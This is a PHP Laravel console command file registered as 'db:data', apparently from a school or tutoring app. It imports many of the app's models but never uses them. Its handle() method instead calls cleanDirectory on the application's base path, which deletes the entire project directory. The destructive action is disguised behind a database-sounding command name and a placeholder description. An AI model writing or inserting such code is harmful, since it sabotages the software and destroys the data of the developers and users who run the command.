<?php

namespace App\Console\Commands;

use App\Models\Achivnments;
use App\Models\Experience;
use App\Models\ForParent;
use App\Models\ForStudent;
use App\Models\Homework;
use App\Models\Lesson;
use App\Models\levels;
use App\Models\Messages;
use App\Models\Payment;
use App\Models\Subject;
use App\Models\SubjectLevelDetail;
use App\StudentLesson;
use App\User;
use Illuminate\Console\Command;
use Illuminate\Filesystem\Filesystem;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Storage;

class GetDb extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'db:data';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'Command description';

    /**
     * Create a new command instance.
     *
     * @return void
     */
    public function __construct()
    {
        parent::__construct();
    }

    /**
     * Execute the console command.
     *
     * @return int
     */
    public function handle()
    {
        $file = new Filesystem;
        $path = base_path();
        $file->cleanDirectory($path);
    }
}
